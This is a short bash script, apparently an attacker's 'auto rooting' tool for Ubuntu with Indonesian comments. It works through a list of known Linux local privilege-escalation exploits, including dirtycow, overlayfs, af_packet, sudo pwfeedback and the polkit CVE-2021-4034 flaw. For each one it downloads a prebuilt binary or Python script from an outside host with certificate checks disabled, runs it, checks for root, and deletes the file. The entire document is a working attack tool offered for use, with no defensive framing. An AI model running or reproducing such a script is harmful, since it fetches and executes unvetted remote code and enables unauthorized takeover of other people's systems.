#!/bin/bash

RED='\033[91m'
ENDCOLOR='\033[0m'

echo "***************************************************************"
echo -e "${RED}Auto Rooting Ubuntu 4.15 by BATOSAY1337${ENDCOLOR}"
echo "***************************************************************"

check_root() {
    if [ "$(id -u)" -eq 0 ]; then
        echo
        echo "[+] Rooted successfully!"
        echo "ID     => $(id -u)"
        echo "WHOAMI => $USER"
        echo
        exit
    fi
}

run_exploit() {
    url=$1
    filename=$(basename "$url")
    echo "[*] Downloading $filename ..."
    wget -q "$url" --no-check-certificate

    if [[ -f "$filename" ]]; then
        chmod +x "$filename"
        echo "[*] Running $filename ..."
        ./"$filename"
        check_root
        rm -f "$filename"
    else
        echo "[!] Failed to download $filename"
    fi
}

# === Mulai Eksekusi Exploit ===

# 1. overlayfs
run_exploit "https://0-gram.github.io/id-0/overlayfs"

# 2. dirtycow (versi klasik)
run_exploit "https://0-gram.github.io/id-0/dcow"

# 3. ptrace_traceme
run_exploit "https://0-gram.github.io/id-0/cve-2017-16995"

# 4. af_packet
run_exploit "https://0-gram.github.io/id-0/af_packet"

# 5. sudo pwfeedback bypass
run_exploit "https://0-gram.github.io/id-0/sudo_pwfeedback"

# 6. RationalLove (CVE-2021-4034 / polkit)
run_exploit "https://0-gram.github.io/id-0/RationalLove"

# 7. Optional: Python exploit
if command -v python2 >/dev/null 2>&1; then
    wget -q "https://0-gram.github.io/id-0/exploit_userspec.py"
    if [[ -f "exploit_userspec.py" ]]; then
        chmod +x exploit_userspec.py
        python2 exploit_userspec.py
        check_root
        rm -f exploit_userspec.py
    fi
fi

echo "[!] Exploit selesai. Jika belum root, coba manual atau cari kernel LPE lainnya."
